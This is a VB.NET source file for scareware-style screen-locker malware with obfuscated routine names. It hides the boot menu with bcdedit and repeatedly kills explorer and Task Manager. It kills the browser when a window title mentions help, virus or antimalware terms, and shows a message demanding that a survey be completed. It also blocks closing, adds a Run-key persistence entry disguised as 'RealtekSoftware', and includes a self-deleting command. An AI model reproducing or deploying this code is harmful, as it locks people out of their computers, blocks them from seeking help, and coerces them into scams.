Public Class Form1
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        BlackBackground.Show()
        Me.TopMost = True
        xvcbdyss()
        nbbvnmmjjk()
        Timer1.Start()
    End Sub

    Public Sub xvcbdyss()
        Dim ikimjmmjjnmkkm
        ikimjmmjjnmkkm = CreateObject("shell.application")
        ikimjmmjjnmkkm.MinimizeAll()

        ikimjmmjjnmkkm = Nothing
    End Sub

    Public Sub nbbvnmmjjk()
        Try
            Shell("bcdedit /set {bootmgr} displaybootmenu no")
        Catch ex As Exception

        End Try
    End Sub

    Public Sub ikmoklkj()
        Try
            My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("RealtekSoftware", """" + Application.ExecutablePath + """")

        Catch ex As Exception

        End Try
    End Sub
    Public Sub oimliumlis()
        Try
            csdcsd()
        Catch ex As Exception

        End Try
    End Sub
    Sub csdcsd()
        My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run").DeleteValue("RealtekSoftware", """" + Application.ExecutablePath + """")
    End Sub

    Public Sub okcxsdry5()
        Process.Start("cmd.exe", "/C ping 1.1.1.1 -n 2 -w 3000 > Nul & Del " & Chr(34) + Application.ExecutablePath & Chr(34))
        End
    End Sub

    Private Sub Form1_Closing(ByVal sender As Object, ByVal e As System.ComponentModel.CancelEventArgs) Handles MyBase.Closing
        e.Cancel = True
    End Sub

    Function ipmiumsxsx() As String
        ipmiumsxsx = My.Computer.Registry.GetValue("HKEY_CLASSES_ROOT\HTTP\shell\open\command", "", "Not Found")
        Dim ikmmkj() As String = Split(ipmiumsxsx, """")
        Return IO.Path.GetFileNameWithoutExtension(ikmmkj(1))
    End Function

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Dim oixosimosie() As Process = Process.GetProcessesByName("explorer")
        Dim sxEXEdopkioo() As Process = Process.GetProcessesByName("taskmgr")
        Try
            For Each Process In oixosimosie
                Process.Kill()
            Next
        Catch nnbbvvvb As Exception
        End Try
        Try
            For Each Process In sxEXEdopkioo
                Process.Kill()

            Next
        Catch ssximsusmus As Exception

        End Try

        Try
            Dim mjimkmo As Process

            For Each mjimkmo In Process.GetProcessesByName(ipmiumsxsx)
                Dim xncksjkdhru = mjimkmo.MainWindowTitle.ToString.ToLower
                If xncksjkdhru.Contains("facebook") Or xncksjkdhru.Contains("youtube") Or xncksjkdhru.Contains("virus") Or xncksjkdhru.Contains("infected") Or xncksjkdhru.Contains("search") Or xncksjkdhru.Contains("windows") Or xncksjkdhru.Contains("bing") Or xncksjkdhru.Contains("nuova scheda") Or xncksjkdhru.Contains("new tab") Or xncksjkdhru.Contains("cerca") Or xncksjkdhru.Contains("malwarebites") Or xncksjkdhru.Contains("help") Or xncksjkdhru.Contains("kij") Then
                    mjimkmo.Kill()
                    Me.Focus()
                    MsgBox("Internet surfing is disabled until you complete the survey or choose any other option to download the file with the product key.", MsgBoxStyle.Critical)
                End If
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub BonfireButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BonfireButton1.Click
        Form2.Show()
    End Sub

    Private Sub BonfireButton2_Click(sender As Object, e As EventArgs) Handles BonfireButton2.Click
        Form2.Show()
    End Sub

End Class
